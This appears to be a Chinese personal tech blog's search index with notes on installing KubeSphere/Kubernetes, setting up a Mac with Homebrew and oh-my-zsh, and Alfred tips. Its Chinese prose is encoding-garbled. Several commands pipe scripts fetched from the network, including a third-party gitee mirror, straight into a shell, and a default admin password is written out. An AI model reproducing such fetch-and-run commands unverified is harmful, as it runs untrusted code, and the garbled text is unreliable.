<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>K8S</title>
    <url>/2022/02/25/K8S/</url>
    <content><![CDATA[<h1 id="K8S"><a href="#K8S" class="headerlink" title="K8S"></a>K8S</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹ä¸»æœºå</span></span><br><span class="line">hostnamectl set-hostname master</span><br><span class="line">hostnamectl set-hostname node1</span><br><span class="line">hostnamectl set-hostname node2</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®æ—¶é—´</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">èƒ½è®¿é—®githubå’Œgoogle</span></span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.2.1 sh -</span><br><span class="line"></span><br><span class="line">chmod +x kk</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸èƒ½è®¿é—®githubå’Œgoogle</span></span><br><span class="line">export KKZONE=cn</span><br><span class="line">curl -sfL https://get-kk.kubesphere.io | VERSION=v1.2.1 sh -</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨æ‚¨ä¸‹è½½ KubeKey åï¼Œå¦‚æœæ‚¨å°†å…¶ä¼ è‡³æ–°çš„æœºå™¨ï¼Œä¸”è®¿é—® Googleapis åŒæ ·å—é™ï¼Œåœ¨æ‚¨æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ä¹‹å‰è¯·åŠ¡å¿…å†æ¬¡æ‰§è¡Œ <span class="built_in">export</span> KKZONE=cn å‘½ä»¤ã€‚</span></span><br><span class="line">chmod +x kk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./kk create config --with-kubernetes v1.21.5 --with-kubesphere v3.2.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./kk create cluster -f config-sample.yaml</span><br><span class="line"></span><br><span class="line">yum install conntrack</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹å®‰è£…æ—¥å¿—</span></span><br><span class="line">kubectl logs -n kubesphere-system $(kubectl get pod -n kubesphere-system -l app=ks-install -o jsonpath=&#x27;&#123;.items[0].metadata.name&#125;&#x27;) -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¯ç”¨kubectè‡ªåŠ¨è¡¥å…¨</span></span><br><span class="line">yum install bash-completion</span><br><span class="line"><span class="meta"># </span><span class="language-bash">Source the completion script <span class="keyword">in</span> your ~/.bashrc file</span></span><br><span class="line">echo &#x27;source &lt;(kubectl completion bash)&#x27; &gt;&gt;~/.bashrc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Add the completion script to the /etc/bash_completion.d directory</span></span><br><span class="line">kubectl completion bash &gt;/etc/bash_completion.d/kubectl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Console: http://192.168.8.200:30880</span><br><span class="line">Account: admin</span><br><span class="line">Password: P@88w0rd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ·»åŠ èŠ‚ç‚¹</span></span><br><span class="line">./kk add nodes -f config-sample.yaml</span><br><span class="line"></span><br><span class="line">./kk delete node &lt;nodeName&gt; -f config-sample.yaml</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤é›†ç¾¤</span></span><br><span class="line">./kk delete cluster -f config-sample.yaml</span><br></pre></td></tr></table></figure>



<h2 id="ä¸‹è½½helm"><a href="#ä¸‹è½½helm" class="headerlink" title="ä¸‹è½½helm"></a>ä¸‹è½½helm</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">export version=v3.6.3</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä»åä¸ºå¼€æºé•œåƒç«™ä¸‹è½½</span></span><br><span class="line">curl -LO https://repo.huaweicloud.com/helm/$&#123;version&#125;/helm-$&#123;version&#125;-linux-amd64.tar.gz</span><br><span class="line">tar -zxvf helm-$&#123;version&#125;-linux-amd64.tar.gz</span><br><span class="line">mv linux-amd64/helm /usr/local/bin/helm</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac æ·±åº¦ä½¿ç”¨æŠ€å·§</title>
    <url>/2022/02/20/Mac-%E6%B7%B1%E5%BA%A6%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="Mac-æ·±åº¦ä½¿ç”¨æŠ€å·§"><a href="#Mac-æ·±åº¦ä½¿ç”¨æŠ€å·§" class="headerlink" title="Mac æ·±åº¦ä½¿ç”¨æŠ€å·§"></a>Mac æ·±åº¦ä½¿ç”¨æŠ€å·§</h1><h2 id="é¦–æ¬¡æ¿€æ´»"><a href="#é¦–æ¬¡æ¿€æ´»" class="headerlink" title="é¦–æ¬¡æ¿€æ´»"></a>é¦–æ¬¡æ¿€æ´»</h2><h3 id="ç³»ç»Ÿè®¾ç½®"><a href="#ç³»ç»Ÿè®¾ç½®" class="headerlink" title="ç³»ç»Ÿè®¾ç½®"></a>ç³»ç»Ÿè®¾ç½®</h3><ul>
<li>è®¾ç½®è½»ç‚¹æ¥ç‚¹æŒ‰ï¼ˆè·Ÿè¸ªé€Ÿåº¦7æ ¼ï¼‰</li>
<li>è®¾ç½®ä¸‰æŒ‡æ‹–ç§»</li>
<li>ç¨‹åºåç§»è‡³å·¦è¾¹</li>
<li>å¼€å¯è¿œç¨‹ç®¡ç†ã€è¿œç¨‹ç™»é™†å’Œæ–‡ä»¶å…±äº«</li>
</ul>
<h3 id="å®‰è£…Homebrew"><a href="#å®‰è£…Homebrew" class="headerlink" title="å®‰è£…Homebrew"></a>å®‰è£…Homebrew</h3><p><a href="https://brew.sh/">https://brew.sh/</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">éœ€è¦ç§‘å­¦ä¸Šç½‘</span></span><br><span class="line">echo &quot;185.199.108.133 raw.githubusercontent.com</span><br><span class="line">140.82.113.3    github.com</span><br><span class="line">199.232.69.194  github.global.ssl.fastly.net&quot; &gt;&gt; /etc/hosts</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£…</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¸è½½</span></span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®é•œåƒæº</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ¢å¤é•œåƒæº</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ— éœ€ç§‘å­¦ä¸Šç½‘</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£… é€‰æ¸…åæº</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="è‡ªåŠ¨åŒ–è„šæœ¬å®‰è£…è½¯ä»¶"><a href="#è‡ªåŠ¨åŒ–è„šæœ¬å®‰è£…è½¯ä»¶" class="headerlink" title="è‡ªåŠ¨åŒ–è„šæœ¬å®‰è£…è½¯ä»¶"></a>è‡ªåŠ¨åŒ–è„šæœ¬å®‰è£…è½¯ä»¶</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">bat æ˜¯ä¸€æ¬¾å¯ç”¨åœ¨ Linux å‘½ä»¤è¡Œæ˜¾ç¤ºæ–‡ä»¶å†…å®¹çš„å·¥å…·ï¼Œbat å‘½ä»¤åŠŸèƒ½è·Ÿå¸¸ç”¨å‘½ä»¤ <span class="built_in">cat</span> ç±»ä¼¼ã€‚åªæ˜¯ bat åŠŸèƒ½ä¸Šæ›´åŠ å¼ºå¤§ä¸€äº›ï¼Œbat åœ¨ <span class="built_in">cat</span> å‘½ä»¤çš„åŸºç¡€ä¸ŠåŠ å…¥äº†è¡Œå·æ˜¾ç¤ºã€ä»£ç é«˜äº®å’Œ Git é›†æˆã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">fzfæ˜¯ä¸€ä¸ªé€šç”¨çš„å‘½ä»¤è¡Œæ¨¡ç³ŠæŸ¥æ‰¾å™¨, é€šè¿‡è¾“å…¥æ¨¡ç³Šçš„å…³é”®è¯å°±å¯ä»¥å®šä½æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚ç»“åˆå…¶ä»–å·¥å…·(æ¯”å¦‚rg)å¯ä»¥å®Œæˆéå¸¸å¤šçš„å·¥ä½œï¼Œåœ¨å·¥ä½œä¸­å¯ä»¥å¤§å¹…æé«˜ä½ çš„å·¥ä½œæ•ˆç‡ã€‚fzfå¯ä»¥ç”¨äºæ–‡ä»¶ã€å‘½ä»¤å†å²è®°å½•ã€è¿›ç¨‹ã€ä¸»æœºåã€ä¹¦ç­¾ã€gitæäº¤ç­‰ã€‚</span></span><br><span class="line"></span><br><span class="line">brew install bat docker-compose fzf git maven nvm wget telnet;</span><br><span class="line"></span><br><span class="line">brew install cask --no-quarantine another-redis-desktop-manager baidunetdisk dingtalk docker drawio google-chrome hiddenbar iina iterm2 jetbrains-toolbox visual-studio-code lepton maczip mounty oracle-jdk golang postman qiyimedia snipaste stats sunloginclient tencent-meeting vmware-fusion wechat qq neteasemusic discord bitwarden typora</span><br></pre></td></tr></table></figure>

<h2 id="è½¯ä»¶æ¨è"><a href="#è½¯ä»¶æ¨è" class="headerlink" title="è½¯ä»¶æ¨è"></a>è½¯ä»¶æ¨è</h2><h3 id="å¿…è£…è½¯ä»¶"><a href="#å¿…è£…è½¯ä»¶" class="headerlink" title="å¿…è£…è½¯ä»¶"></a>å¿…è£…è½¯ä»¶</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alfred iterm2 iina idea typora stats ishot maczip transmit magnet google hidden bar yoink</span><br></pre></td></tr></table></figure>



<ul>
<li><a href="https://www.macwk.com/">https://www.macwk.com/</a></li>
<li>Redis Desktop manager redis å®¢æˆ·ç«¯å·¥å…·</li>
<li>Alfred 4 æœç´¢</li>
<li>Hidden Bar èœå•æ å›¾æ ‡æ˜¾ç¤ºéšè—</li>
<li>IINA è§†é¢‘æ’­æ”¾å™¨</li>
<li>Iterm 2 ç»ˆç«¯ </li>
<li>Jetbarins ToolBox  å¼€å‘å·¥å…·ç®¡ç†ï¼Œå¯ä»¥ç”¨æ¥å®‰è£…å¼€å‘å·¥å…·</li>
<li>Mac zip  è§£å‹ç¼©å·¥å…· </li>
<li>Mountry NTFSè¯»å†™å·¥å…·</li>
<li>Ishotæˆªå›¾è½¯ä»¶</li>
<li>stats ç”¨æ¥å±•ç¤ºç³»ç»ŸçŠ¶æ€</li>
<li>Path Finder Finder è¾…åŠ©å·¥å…·</li>
<li>Screen Flow å±å¹•å½•åˆ¶å·¥å…·</li>
<li>Transmit  SFTP æ–‡ä»¶æœåŠ¡å™¨</li>
<li>Dowine 4  ç½‘ç«™è§†é¢‘ä¸‹è½½å·¥å…·</li>
<li>Motrix      å¤šçº¿ç¨‹ä¸‹è½½å·¥å…·</li>
<li>Rectangle åˆ†å±å·¥å…·</li>
<li>yoink    ä¸´æ—¶ä»“åº“</li>
<li>Terminus ç»ˆç«¯å·¥å…·</li>
<li>one switch å°å·¥å…·(éšè—æ¡Œé¢,å±å¹•å¸¸äº®)</li>
<li>æŸ æª¬æ¸…ç† </li>
<li>Dev-sidecar(gitee) å¼€å‘è€…è¾¹è½¦ï¼Œgithubæ‰“ä¸å¼€ï¼Œgithub åŠ é€Ÿ, git cloneåŠ é€Ÿï¼Œgoogle CDNåŠ é€Ÿï¼ŒStack OverflowåŠ é€Ÿ</li>
<li>lepton ä»£ç ç‰‡æ®µç®¡ç†å·¥å…·</li>
<li>Typora</li>
<li>discord</li>
<li>bitwarden</li>
<li>èŠ±ç”Ÿå£³</li>
<li>ç½‘æ˜“æœ‰é“è¯å…¸</li>
<li>å‘æ—¥è‘µ</li>
<li>cheatsheet</li>
<li>clashx</li>
<li>dash</li>
<li>discord</li>
<li>docker</li>
<li>draw.io</li>
<li>goland</li>
<li>idea</li>
<li>webstorm</li>
<li>Pycharm</li>
<li>google</li>
<li>magnet</li>
<li>office</li>
<li>microsoft remote desktop</li>
<li>Mongoldb compass</li>
<li>Navicat premium</li>
<li>Offset explorer 2</li>
<li>Pdf reader pro</li>
<li>picgo</li>
<li>postman</li>
<li>Regex101</li>
<li>teamviewer</li>
<li>todesk</li>
<li>transmit</li>
<li>visual studio code</li>
<li>Switchhost</li>
</ul>
<h2 id="è½¯ä»¶æŠ€å·§"><a href="#è½¯ä»¶æŠ€å·§" class="headerlink" title="è½¯ä»¶æŠ€å·§"></a>è½¯ä»¶æŠ€å·§</h2><h3 id="Iterm2"><a href="#Iterm2" class="headerlink" title="Iterm2"></a>Iterm2</h3><h4 id="é…ç½®äº‘ç«¯å­˜å‚¨"><a href="#é…ç½®äº‘ç«¯å­˜å‚¨" class="headerlink" title="é…ç½®äº‘ç«¯å­˜å‚¨"></a>é…ç½®äº‘ç«¯å­˜å‚¨</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202212337013.png" alt="image-20220221233708935"></p>
<h4 id="å®‰è£…-oh-my-zsh"><a href="#å®‰è£…-oh-my-zsh" class="headerlink" title="å®‰è£… oh-my-zsh"></a>å®‰è£… oh-my-zsh</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh</span><br><span class="line"></span><br><span class="line">vim ~/.zshrc</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹ä¸»é¢˜</span></span><br><span class="line">ZSH_THEME=&quot;robbyrussell&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">é‡è½½é…ç½®ç”Ÿæ•ˆ</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<ul>
<li>è®¾ç½®èƒŒæ™¯</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239513.png" alt="image-20211222140203521"></p>
<ul>
<li>Autosuggestion å‘½ä»¤è‡ªåŠ¨è¡¥å…¨</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">1.ä¸‹è½½æ’ä»¶</span></span><br><span class="line">git clone git://github.com/zsh-users/zsh-autosuggestions ~/.oh-my-zsh/plugins/zsh-autosuggestions</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">2.é…ç½®</span> </span><br><span class="line">plugins=(git zsh-autosuggestions)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">3.åŠ è½½é…ç½®</span></span><br><span class="line">exec zsh</span><br></pre></td></tr></table></figure>

<h3 id="Alfred"><a href="#Alfred" class="headerlink" title="Alfred"></a>Alfred</h3><h4 id="é…ç½®äº‘ç«¯å­˜å‚¨é…ç½®"><a href="#é…ç½®äº‘ç«¯å­˜å‚¨é…ç½®" class="headerlink" title="é…ç½®äº‘ç«¯å­˜å‚¨é…ç½®"></a>é…ç½®äº‘ç«¯å­˜å‚¨é…ç½®</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202202239528.png" alt="image-20211222141241785"></p>
<h3 id="çŸ­ä¿¡åŒæ­¥é…ç½®"><a href="#çŸ­ä¿¡åŒæ­¥é…ç½®" class="headerlink" title="çŸ­ä¿¡åŒæ­¥é…ç½®"></a>çŸ­ä¿¡åŒæ­¥é…ç½®</h3><p>é…ç½®è‹¹æœæ‰‹æœºå’Œè‹¹æœç”µè„‘çŸ­ä¿¡åŒæ­¥</p>
]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>mac</tag>
      </tags>
  </entry>
  <entry>
    <title>Chaos</title>
    <url>/2022/02/25/Chaos/Chaos/</url>
    <content><![CDATA[<h1 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h1><p><code>tee</code>åˆ™æ¥è‡ªäº<code>T</code>,æ˜¯ç®¡çº¿å·¥äººçš„æœ¯è¯­ï¼Œä»£è¡¨Tå‹çš„ç®¡çº¿åˆ†å‰å™¨ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git push --set-upstream origin master</span><br><span class="line">æœ‰äº†è¿™è¡Œå‘½ä»¤å°±å¯ä»¥ä¸ç”¨åœ¨git push åé¢åŠ origin masteräº†</span><br></pre></td></tr></table></figure>



<h2 id="Alfred-4"><a href="#Alfred-4" class="headerlink" title="Alfred 4"></a>Alfred 4</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">åº”ç”¨æœç´¢</span></span><br><span class="line">è¾“å…¥åº”ç”¨å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ–‡ä»¶æˆ–ç›®å½•æœç´¢</span></span><br><span class="line">find æ–‡ä»¶å</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–‡æœ¬å†…å®¹æœç´¢ åˆ—å‡ºç£ç›˜ä¸­åŒ…å«è¯¥æ–‡æœ¬çš„ç›¸å…³æ–‡ä»¶</span></span><br><span class="line">in å¾…æœç´¢çš„æ–‡æœ¬</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ ‡è®°æœç´¢ è¾“å…¥ tags å‘½ä»¤ï¼Œä»¥åŠå¾…æœç´¢çš„æ ‡è®°é¢œè‰²ä¸­æ–‡åç§°ï¼Œåˆ—å‡ºæ‰“ä¸Šç›¸åº”æ ‡è®°çš„ç›®å½•ï¼Œå¯ä»¥å¿«é€Ÿå®šä½æ ‡è®°ç›®å½•ã€‚</span></span><br><span class="line">tags ç°è‰²</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¿«æ·æœç´¢ å¯ä»¥è‡ªå®šä¹‰å¸¸ç”¨çš„ç½‘é¡µæœç´¢</span></span><br><span class="line">google å¾…æœç´¢çš„å†…å®¹</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¹¦ç­¾æœç´¢ åœ¨æµè§ˆå™¨çš„å¤§é‡ä¹¦ç­¾ä¸­å¿«é€Ÿæœç´¢ã€‚</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å‰ªåˆ‡æ¿æœç´¢</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç³»ç»Ÿå¸¸ç”¨å‘½ä»¤å¿«æ·æ“ä½œ</span></span><br><span class="line">é€šè¿‡ alfred å¯ä»¥å¿«æ·åœ°æ“ä½œç³»ç»Ÿé”å±ã€å…³æœºã€é‡å¯ã€ä¼‘çœ ç­‰åå‡ ç§æŒ‡ä»¤ï¼Œéå¸¸ä¾¿æ·ã€‚å¯¹äºå¼ºè¿«ç—‡ç”¨æˆ·æ¥è¯´ï¼Œå”¤èµ·å±ä¿ã€ä¼‘çœ ã€æ¸…ç©ºåƒåœ¾ç¯“ã€é€€å‡ºåº”ç”¨ç­‰æŒ‡ä»¤å¯èƒ½è¾ƒä¸ºå¸¸ç”¨ã€‚</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è‡ªå®šä¹‰å·¥ä½œæµ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>æ˜é‡‘æœç´¢ï¼š<code>alfred://customsearch/Search%20Juejin%20for%20%27%7Bquery%7D%27/jj/utf8/nospace/https%3A%2F%2Fjuejin.im%2Fsearch%3Ftype%3Dall%26query%3D%7Bquery%7D</code></li>
<li>ç®€ä¹¦æœç´¢ï¼š<code>alfred://customsearch/Search%20Jianshu%20for%20%27%7Bquery%7D%27/js/utf8/nospace/https%3A%2F%2Fwww.jianshu.com%2Fsearch%3Futf8%3D%25E2%259C%2593%26q%3D%7Bquery%7D</code></li>
<li>å¾®ä¿¡æ–‡ç« ï¼š<code>alfred://customsearch/Search%20Weixin%20for%20%27%7Bquery%7D%27/gzh/utf8/nospace/https%3A%2F%2Fweixin.sogou.com%2Fweixin%3Ftype%3D2%26query%3D%7Bquery%7D</code></li>
<li>çŸ¥ä¹å†…å®¹ï¼š<code>alfred://customsearch/Search%20Zhihu%20for%20%27%7Bquery%7D%27/zh/utf8/nospace/https%3A%2F%2Fwww.zhihu.com%2Fsearch%3Ftype%3Dcontent%26q%3D%7Bquery%7D</code></li>
<li>è‹¹æœæ–‡æ¡£ï¼š<code>alfred://customsearch/Search%20%EF%A3%BFDeveloper%20for%20%27%7Bquery%7D%27/ad/utf8/nospace/https%3A%2F%2Fdeveloper.apple.com%2Fsearch%2F%3Fq%3D%7Bquery%7D</code></li>
<li>æ·˜å®æœç´¢ï¼š<code>alfred://customsearch/Search%20Taobao%20for%20%27%7Bquery%7D%27/tb/utf8/nospace/https%3A%2F%2Fs.taobao.com%2Fsearch%3Foe%3Dutf-8%26f%3D8%26q%3D%7Bquery%7D</code></li>
<li>äº¬ä¸œæœç´¢ï¼š<code>alfred://customsearch/Search%20JD%20for%20%27%7Bquery%7D%27/jd/utf8/nospace/https%3A%2F%2Fsearch.jd.com%2FSearch%3Fenc%3Dutf-8%26keyword%3D%7Bquery%7D</code></li>
<li>GitHubï¼š<code>alfred://customsearch/Search%20Github%20for%20%27%7Bquery%7D%27/sh/utf8/nospace/https%3A%2F%2Fgithub.com%2Fsearch%3Futf8%3D%25E2%259C%2593%26q%3D%7Bquery%7D</code></li>
<li>StackOverflowï¼š<code>alfred://customsearch/Search%20StackOverflow%20for%20%27%7Bquery%7D%27/so/utf8/nospace/https%3A%2F%2Fwww.stackoverflow.com%2Fsearch%3Fq%3D%7Bquery%7D</code></li>
</ul>
<h3 id="Workflowsï¼ˆå·¥ä½œæµï¼‰"><a href="#Workflowsï¼ˆå·¥ä½œæµï¼‰" class="headerlink" title="Workflowsï¼ˆå·¥ä½œæµï¼‰"></a>Workflowsï¼ˆå·¥ä½œæµï¼‰</h3><p><img src="https://github.com/iHTCboy/iGallery/raw/master/BlogImages/2020/02/Alfred-Workflows.png" alt="Alfred-Workflows.png"></p>
<p><code>Workflows</code> ç¿»è¯‘ä¸­æ–‡ä¸º<strong>å·¥ä½œæµ</strong>ï¼Œåº”è¯¥ä¹Ÿæ¯”è¾ƒå¥½ç†è§£ã€‚åˆšæ‰ä¸Šé¢ä»‹ç»çš„åŠŸèƒ½ï¼Œæœ‰ä¸€éƒ¨åˆ†å°±æ˜¯å·¥ä½œæµï¼Œå¯ä»¥ç†è§£ä¸ºAlfredè‡ªå¸¦çš„å·¥ä½œæµã€‚ç±»ä¼¼çš„ï¼Œä½ æ˜¯ä¸æ˜¯èƒ½æƒ³åˆ°ä¸€äº›å¯ä»¥å®šåˆ¶åŒ–çš„æ“ä½œæµç¨‹å‘¢ï¼Ÿæ‰€ä»¥ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„å·¥ä½œæµï¼Œæˆ–è€…è‡ªå·±å®šä¹‰è‡ªå·±çš„å·¥ä½œæµï¼</p>
<p>å¦‚æœæƒ³è¦ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„æˆ–è€…è‡ªå®šä¹‰çš„å·¥ä½œæµï¼Œéœ€è¦æ”¯ä»˜è´­ä¹°Alfredçš„<code>PowerPack</code>ï¼ˆåŠ¨åŠ›ç»„ï¼‰ï¼ŒAlfredçš„ PowerPack æ˜¯æœ€å€¼å¾—è´­ä¹°çš„æœåŠ¡ï¼Œæ²¡æœ‰ä¹‹ä¸€ã€‚å› ä¸ºå¦‚æœä½¿ç”¨ Alfred è€Œæ²¡æœ‰ PowerPack æˆæƒï¼Œé‚£ Alfred çš„å¼ºå¤§çš„åŠŸèƒ½ç›¸å½“å¤±å»äº†å·¦å³è‡‚ã€‚å…³äº PowerPack ç»†èŠ‚æˆ‘ä»¬åœ¨ä¸‹ä¸€èŠ‚å†…å®¹åœ¨è®¨è®ºï¼Œæˆ‘ä»¬æ¥ç€è¯´ Workflowsï¼ˆå·¥ä½œæµï¼‰ã€‚</p>
<p>Alfred å®‰è£…å®Œã€ŒPowerpackã€ï¼Œå°±åƒè½¦ä½“å®‰è£…äº†å¼•æ“ï¼Œä½™ä¸‹çš„äº‹æƒ…å°±çœ‹æˆ‘ä»¬å¦‚ä½• DIYï¼Œè®©å¼•æ“ä¸ºæˆ‘ä»¬æä¾›æ— é™åŠ¨åŠ›ã€‚è€Œå¼•æ“æä¾›åŠ¨åŠ›çš„ç‡ƒæ–™æˆ‘ä»¬ç§°å…¶ä¸º <code>Workflow</code>ã€‚å®˜æ–¹å¯¹äº workflow æ˜¯è¿™æ ·æè¿°çš„ï¼š</p>
<blockquote>
<p>With Alfredâ€™s Powerpack and workflows, you can extend Alfred and get things done in your own way. Replace repetitive tasks with workflows, and boost your productivity.<br>Discover the abundance of workflows that integrate with your favourite Mac applications and web services, from social networks and note-taking apps to shopping and music services.<br>Weâ€™ve hand-picked a few of the best workflows here. Youâ€™ll find hundreds more on <a href="http://www.packal.org/">Packal</a>, a brilliant user-created repository for workflows, as well as on <a href="https://alfredforum.com/">Alfred Forum</a>, where youâ€™ll also find help in creating your own workflows.<br>å€ŸåŠ©Alfredçš„Powerpackå’Œå·¥ä½œæµç¨‹ï¼Œæ‚¨å¯ä»¥æ‰©å±•Alfredå¹¶ä»¥è‡ªå·±çš„æ–¹å¼å®Œæˆå·¥ä½œã€‚ç”¨å·¥ä½œæµæ›¿æ¢é‡å¤çš„ä»»åŠ¡ï¼Œå¹¶æé«˜å·¥ä½œæ•ˆç‡ã€‚<br>å‘ç°ä¸°å¯Œçš„å·¥ä½œæµç¨‹ï¼Œè¿™äº›å·¥ä½œæµç¨‹ä¸æ‚¨å–œæ¬¢çš„Macåº”ç”¨ç¨‹åºå’ŒWebæœåŠ¡é›†æˆåœ¨ä¸€èµ·ï¼Œä»ç¤¾äº¤ç½‘ç»œå’Œè®°ç¬”è®°åº”ç”¨ç¨‹åºåˆ°è´­ç‰©å’ŒéŸ³ä¹æœåŠ¡ã€‚<br>æˆ‘ä»¬åœ¨è¿™é‡Œæ‰‹å·¥æŒ‘é€‰äº†ä¸€äº›æœ€ä½³çš„å·¥ä½œæµç¨‹ã€‚åœ¨ <a href="http://www.packal.org/">Packal</a>ï¼ˆä¸€ä¸ªå‡ºè‰²çš„ç”±ç”¨æˆ·åˆ›å»ºä¸Šä¼ çš„workflowsçš„ç½‘ç«™ï¼‰ä¸Šä»¥åŠ <a href="https://alfredforum.com/">Alfred Forum</a>ï¼ˆæ‚¨å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°æœ‰å…³åˆ›å»ºè‡ªå·±çš„workflowsçš„å¸®åŠ©ï¼‰çš„æ›´å¤šä¿¡æ¯ã€‚</p>
</blockquote>
